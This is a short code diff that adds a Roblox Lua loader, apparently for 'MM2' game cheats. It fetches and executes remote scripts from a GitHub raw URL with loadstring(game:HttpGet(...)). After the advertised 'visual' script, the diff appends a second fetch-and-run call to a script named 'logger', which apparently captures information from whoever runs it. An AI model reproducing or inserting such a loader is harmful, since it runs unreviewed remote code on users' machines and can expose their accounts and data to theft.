@@ -1,0 +1,4 @@
+ID="85f6b1a4-54b3-4ad9-9047-9fe2fe3ed4e2";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/F0loks/MM2/refs/heads/main/visual.luau"));
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/F0loks/MM2/refs/heads/main/logger"))()
